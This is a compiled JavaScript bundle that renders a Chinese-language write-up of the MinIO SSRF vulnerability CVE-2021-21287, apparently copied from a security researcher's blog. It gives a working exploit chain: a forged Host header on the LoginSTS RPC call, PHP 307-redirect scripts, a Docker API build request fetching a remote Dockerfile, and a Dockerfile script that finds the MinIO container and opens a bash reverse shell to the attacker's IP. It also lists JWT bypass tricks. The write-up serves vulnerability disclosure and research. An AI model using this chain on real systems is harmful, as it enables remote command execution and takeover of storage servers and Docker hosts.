(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{1441:function(e,t,s){e.exports=s.p+"assets/img/6896653c-ba8c-476c-a224-6b6dfce60186.b343e5876f15.2bbca11c.png"},1442:function(e,t,s){e.exports=s.p+"assets/img/7861ca8b-00bb-4393-bee8-98331154fdae.c06372e6404a.c546b78b.png"},1443:function(e,t,s){e.exports=s.p+"assets/img/580f2f79-5147-4810-b517-72dfffa6fae8.0acbf2375916.86416c3b.png"},1444:function(e,t,s){e.exports=s.p+"assets/img/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.6488ddc9fcc5.12d54097.png"},1445:function(e,t,s){e.exports=s.p+"assets/img/d699b863-4102-4479-a4e0-71d15efaf1c3.21a8369589c2.a68ad9bc.png"},1446:function(e,t,s){e.exports=s.p+"assets/img/187c113f-1d4a-4806-897d-4e3f62c25042.28dcdefd4ec2.e662e856.png"},1447:function(e,t,s){e.exports=s.p+"assets/img/565c0dff-2e74-4ea0-995a-38881ae7207d.7dbb1fcf3d08.11a5cd15.png"},1448:function(e,t,s){e.exports=s.p+"assets/img/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.5026e621dd2a.7666b378.png"},1449:function(e,t,s){e.exports=s.p+"assets/img/db483d55-f1d5-4a3e-9d00-b53d9833d464.da172f0b4e32.87d383d3.png"},2245:function(e,t,s){"use strict";s.r(t);var a=s(75),n=Object(a.a)({},(function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"minio-ssrf漏洞-cve-2021-21287"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#minio-ssrf漏洞-cve-2021-21287"}},[e._v("#")]),e._v(" MinIO SSRF漏洞 CVE-2021-21287")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，"),a("a",{attrs:{href:"https://min.io/",target:"_blank",rel:"noopener noreferrer"}},[e._v("MinIO"),a("OutboundLink")],1),e._v("就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k星星。MinIO中存在SSRF漏洞，通过漏洞可以获取敏感信息或远程命令执行")]),e._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("MinIO")]),a("br"),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("p",[e._v("既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。")]),e._v(" "),a("p",[e._v("那么从入口点（前端接口）开始对其进行代码审计吧。")]),e._v(" "),a("p",[e._v("在User-Agent满足正则"),a("code",[e._v(".*Mozilla.*")]),e._v("的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/6896653c-ba8c-476c-a224-6b6dfce60186.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1441),alt:"image-20210124211255239.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了"),a("code",[e._v("webRequestAuthenticate")]),e._v("，跟进看一下，发现这里用的是jwt鉴权：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/7861ca8b-00bb-4393-bee8-98331154fdae.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1442),alt:"image-20210124211738748.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("jwt常见的攻击方法主要有下面这几种：")]),e._v(" "),a("p",[a("code",[e._v("将alg设置为None，告诉服务器不进行签名校验")])]),e._v(" "),a("p",[a("code",[e._v("如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验")])]),e._v(" "),a("p",[a("code",[e._v("爆破签名密钥")])]),e._v(" "),a("p",[e._v("查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/580f2f79-5147-4810-b517-72dfffa6fae8.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1443),alt:"image-20210124212344593.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变地简单一些。")]),e._v(" "),a("p",[e._v("鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。")]),e._v(" "),a("p",[e._v("很快找到了一个接口，"),a("code",[e._v("LoginSTS")]),e._v("。这个接口其实是AWS STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。")]),e._v(" "),a("p",[e._v("简化其代码如下：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('// LoginSTS - STS user login handler.\nfunc (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error {\n    ctx := newWebContext(r, args, "WebLoginSTS")\n\n    v := url.Values{}\n    v.Set("Action", webIdentity)\n    v.Set("WebIdentityToken", args.Token)\n    v.Set("Version", stsAPIVersion)\n\n    scheme := "http"\n    // ...\n\n    u := &url.URL{\n        Scheme: scheme,\n        Host:   r.Host,\n    }\n\n    u.RawQuery = v.Encode()\n    req, err := http.NewRequest(http.MethodPost, u.String(), nil)\n    // ...\n}\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br"),a("span",{staticClass:"line-number"},[e._v("5")]),a("br"),a("span",{staticClass:"line-number"},[e._v("6")]),a("br"),a("span",{staticClass:"line-number"},[e._v("7")]),a("br"),a("span",{staticClass:"line-number"},[e._v("8")]),a("br"),a("span",{staticClass:"line-number"},[e._v("9")]),a("br"),a("span",{staticClass:"line-number"},[e._v("10")]),a("br"),a("span",{staticClass:"line-number"},[e._v("11")]),a("br"),a("span",{staticClass:"line-number"},[e._v("12")]),a("br"),a("span",{staticClass:"line-number"},[e._v("13")]),a("br"),a("span",{staticClass:"line-number"},[e._v("14")]),a("br"),a("span",{staticClass:"line-number"},[e._v("15")]),a("br"),a("span",{staticClass:"line-number"},[e._v("16")]),a("br"),a("span",{staticClass:"line-number"},[e._v("17")]),a("br"),a("span",{staticClass:"line-number"},[e._v("18")]),a("br"),a("span",{staticClass:"line-number"},[e._v("19")]),a("br"),a("span",{staticClass:"line-number"},[e._v("20")]),a("br"),a("span",{staticClass:"line-number"},[e._v("21")]),a("br")])]),a("p",[e._v("没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。")]),e._v(" "),a("p",[e._v("这个过程有什么问题呢？")]),e._v(" "),a("p",[e._v("因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。")]),e._v(" "),a("p",[e._v("我们来实际测试一下，向"),a("code",[e._v("http://192.168.227.131:9000")]),e._v("发送如下请求，其中Host的值是我本地ncat开放的端口（"),a("code",[e._v("192.168.1.142:4444")]),e._v("）：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('POST /minio/webrpc HTTP/1.1\nHost: 192.168.1.142:4444\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\nContent-Type: application/json\nContent-Length: 80\n\n{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br"),a("span",{staticClass:"line-number"},[e._v("5")]),a("br"),a("span",{staticClass:"line-number"},[e._v("6")]),a("br"),a("span",{staticClass:"line-number"},[e._v("7")]),a("br")])]),a("p",[e._v("成功收到请求：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1444),alt:"image-20210124215812861.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("可以确定这里存在一个SSRF漏洞了。")]),e._v(" "),a("p",[e._v("仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数"),a("code",[e._v("WebIdentityToken")]),e._v("。")]),e._v(" "),a("p",[e._v("但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。")]),e._v(" "),a("p",[e._v("幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。")]),e._v(" "),a("p",[e._v("使用PHP来简单地构造一个302跳转：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("<?php\nheader('Location: http://192.168.1.142:4444/attack?arbitrary=params');\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("将其保存成index.php，启动一个PHP服务器：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/d699b863-4102-4479-a4e0-71d15efaf1c3.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1445),alt:"image-20210124225105734.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("将Host指向这个PHP服务器。这样，经过一次302跳转，我们收获了一个可以控制完整URL的GET请求：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/187c113f-1d4a-4806-897d-4e3f62c25042.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1446),alt:"image-20210124224837443.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击Docker集群的2375端口。")]),e._v(" "),a("p",[e._v("2375是Docker API的接口，使用HTTP协议通信，默认不会监听TCP地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过SSRF来攻击这个接口呢？")]),e._v(" "),a("p",[e._v("在Docker未授权访问的情况下，我们通常可以使用"),a("code",[e._v("docker run")]),e._v("或"),a("code",[e._v("docker exec")]),e._v("来在目标容器里执行任意命令（如果你不了解，可以参考[这篇文章](http://blog.neargle.com/SecNewsBak/drops/新姿势之Docker Remote API未授权访问漏洞分析和利用.html)）。但是翻阅Docker的文档可知，这两个操作的请求是"),a("code",[e._v("POST /containers/create")]),e._v("和"),a("code",[e._v("POST /containers/{id}/exec")]),e._v("。")]),e._v(" "),a("p",[e._v("两个API都是POST请求，而我们可以构造的SSRF却是一个GET的。怎么办呢？")]),e._v(" "),a("p",[e._v("还记得我们是怎样获得这个GET型的SSRF的吗？通过302跳转，而接受第一次跳转的请求就是一个POST请求。不过我们没法直接利用这个POST请求，因为他的Path不可控。")]),e._v(" "),a("p",[e._v("如何构造一个Path可控的POST请求呢？")]),e._v(" "),a("p",[e._v("我想到了307跳转，307跳转是在"),a("a",{attrs:{href:"https://tools.ietf.org/html/rfc7231#page-58",target:"_blank",rel:"noopener noreferrer"}},[e._v("RFC 7231"),a("OutboundLink")],1),e._v("中定义的一种HTTP状态码，描述如下：")]),e._v(" "),a("blockquote",[a("p",[e._v("The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent "),a("strong",[e._v("MUST NOT")]),e._v(" change the request method if it performs an automatic redirection to that URI.")])]),e._v(" "),a("p",[e._v("307跳转的特点就是"),a("strong",[e._v("不会")]),e._v("改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。")]),e._v(" "),a("p",[e._v("我们正好可以利用这个特性，来获得POST请求。")]),e._v(" "),a("p",[e._v("简单修改一下之前的index.php：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("<?php\nheader('Location: http://192.168.1.142:4444/attack?arbitrary=params', false, 307);\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("尝试SSRF攻击，收到了预期的请求：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/565c0dff-2e74-4ea0-995a-38881ae7207d.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1447),alt:"image-20210124232243242.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("Bingo，获得了一个POST请求的SSRF，虽然没有Body。")]),e._v(" "),a("p",[e._v("回到Docker API，我发现现在仍然没法对run和exec两个API做利用，原因是，这两个API都需要在请求Body中传输JSON格式的参数，而我们这里的SSRF无法控制Body。")]),e._v(" "),a("p",[e._v("继续翻越Docker文档，我发现了另一个API，"),a("a",{attrs:{href:"https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild",target:"_blank",rel:"noopener noreferrer"}},[e._v("Build an image"),a("OutboundLink")],1),e._v("：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1448),alt:"image-20210124232945843.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("这个API的大部分参数是通过Query Parameters传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为"),a("code",[e._v("remote")]),e._v("的参数，其说明为：")]),e._v(" "),a("blockquote",[a("p",[e._v("A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called "),a("code",[e._v("Dockerfile")]),e._v(" and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the "),a("code",[e._v("dockerfile")]),e._v(" parameter is also specified, there must be a file with the corresponding path inside the tarball.")])]),e._v(" "),a("p",[e._v("这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。")]),e._v(" "),a("p",[e._v("也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。")]),e._v(" "),a("p",[e._v("所以，我尝试编写了这样一个Dockerfile，看看是否能够build这个镜像，如果可以，那么我的4444端口应该能收到wget的请求：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("FROM alpine:3.13\nRUN wget -T4 http://192.168.1.142:4444/docker/build\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("然后修改前面的index.php，指向Docker集群的2375端口：")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("<?php\nheader('Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&nocache=true&t=evil:1', false, 307);\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("进行SSRF攻击，等待了一会儿，果然收到请求了：")]),e._v(" "),a("p",[a("a",{attrs:{href:"https://www.leavesongs.com/media/attachment/2021/01/30/db483d55-f1d5-4a3e-9d00-b53d9833d464.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:s(1449),alt:"image-20210124233853616.png"}}),a("OutboundLink")],1)]),e._v(" "),a("p",[e._v("完美，我们已经可以在目标集群容器里执行任意命令了。")]),e._v(" "),a("p",[e._v("此时离我们的目标，拿下MinIO，还差一点点，后面的攻击其实就比较简单了。")]),e._v(" "),a("p",[e._v("因为现在可以执行任意命令，我们就不会再受到SSRF漏洞的限制，可以直接反弹一个shell，或者可以直接发送任意数据包到Docker API，来访问容器。经过一顿测试，我发现MinIO虽然是运行的一个service，但实际上就只有一个容器。")]),e._v(" "),a("p",[e._v("所以我编写了一个自动化攻击MinIO容器的脚本，并将其放在了Dockerfile中，让其在Build的时候进行攻击，利用"),a("code",[e._v("docker exec")]),e._v("在MinIO的容器里执行反弹shell的命令。这个Dockerfile如下：")]),e._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[e._v("FROM alpine:3.13\n\nRUN apk "),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("add")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("curl")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("bash")]),e._v(" jq\n\nRUN "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" -ex "),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v("&&")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("{")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'#!/bin/bash'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'set -ex'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'target=\"http://192.168.227.131:2375\"'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v('\'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'for item in ${jsons[@]}; do'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'    name=$(echo $item | base64 -d | jq -r \".Image\")'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v('\'    if [[ "$name" == *"minio/minio"* ]]; then\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'        id=$(echo $item | base64 -d | jq -r \".Id\")'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'        break'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'    fi'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'done'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v('\'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\\"Cmd\\": [\\"bash\\", \\"-c\\", \\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\"]}" | jq -r ".Id")\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("echo")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[e._v('\'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("\\")]),e._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("}")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v("|")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("bash")]),e._v("\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br"),a("span",{staticClass:"line-number"},[e._v("5")]),a("br"),a("span",{staticClass:"line-number"},[e._v("6")]),a("br"),a("span",{staticClass:"line-number"},[e._v("7")]),a("br"),a("span",{staticClass:"line-number"},[e._v("8")]),a("br"),a("span",{staticClass:"line-number"},[e._v("9")]),a("br"),a("span",{staticClass:"line-number"},[e._v("10")]),a("br"),a("span",{staticClass:"line-number"},[e._v("11")]),a("br"),a("span",{staticClass:"line-number"},[e._v("12")]),a("br"),a("span",{staticClass:"line-number"},[e._v("13")]),a("br"),a("span",{staticClass:"line-number"},[e._v("14")]),a("br"),a("span",{staticClass:"line-number"},[e._v("15")]),a("br"),a("span",{staticClass:"line-number"},[e._v("16")]),a("br"),a("span",{staticClass:"line-number"},[e._v("17")]),a("br"),a("span",{staticClass:"line-number"},[e._v("18")]),a("br"),a("span",{staticClass:"line-number"},[e._v("19")]),a("br"),a("span",{staticClass:"line-number"},[e._v("20")]),a("br")])]),a("p",[e._v("这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含"),a("code",[e._v("minio/minio")]),e._v("，则认为这个容器就是MinIO所在的容器。拿到这个容器的Id，用exec的API，在其中执行反弹shell的命令。")]),e._v(" "),a("p",[e._v("最后成功"),a("a",{attrs:{href:"https://youtu.be/WyDEn0wUhPc",target:"_blank",rel:"noopener noreferrer"}},[e._v("拿到MinIO容器的shell"),a("OutboundLink")],1)]),e._v(" "),a("h2",{attrs:{id:"参考文章"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考文章"}},[e._v("#")]),e._v(" 参考文章")]),e._v(" "),a("a-alert",{attrs:{type:"success",message:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html",description:"",showIcon:""}})],1)}),[],!1,null,null,null);t.default=n.exports}}]);